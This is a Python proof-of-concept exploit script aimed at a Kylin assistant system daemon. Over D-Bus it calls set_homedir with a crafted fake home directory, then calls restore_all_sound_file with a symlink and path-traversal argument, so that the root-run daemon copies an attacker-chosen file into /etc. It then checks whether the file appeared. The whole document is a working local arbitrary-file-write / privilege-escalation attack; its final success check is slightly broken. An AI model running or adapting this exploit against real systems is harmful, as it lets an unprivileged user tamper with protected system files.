#!/usr/bin/env python3

import sys
import dbus
import os

def run_cmd(cmd):
    os.system(cmd)

def copy_file(target_dir, src_file):
    copy_cmd=f'''
        srcDir=$(mktemp -d)
        homeDir=/tmp/fakeroot/$srcDir
        srcFile={src_file}
        targetDir={target_dir}
        gdbus call --system --dest com.kylin.assistant.systemdaemon \
                        --object-path /com/kylin/assistant/systemdaemon \
                        --method com.kylin.assistant.systemdaemon.set_homedir "$homeDir"

        # prepre src dir
        mkdir -p $srcDir/stereo
        cp $srcFile $srcDir/stereo

        # prepare target dir
        mkdir -p $homeDir
        mkdir -p $homeDir/.sounds..
        cd $homeDir
        ln -s $targetDir stereo

        gdbus call --system --dest com.kylin.assistant.systemdaemon \
                        --object-path /com/kylin/assistant/systemdaemon \
                        --method com.kylin.assistant.systemdaemon.restore_all_sound_file "../../../..$srcDir"

    '''
    run_cmd(copy_cmd)

os.system('touch restore_all_sound_file.txt')
copy_file("/etc", os.path.realpath("./restore_all_sound_file.txt"))
result=os.popen('ls -l /etc/restore_all_sound_file.txt')
if result.read=="restore_all_sound_file.txt":
    print("succ")
else :
    print("fail",result.read())
os.system('rm restore_all_sound_file.txt')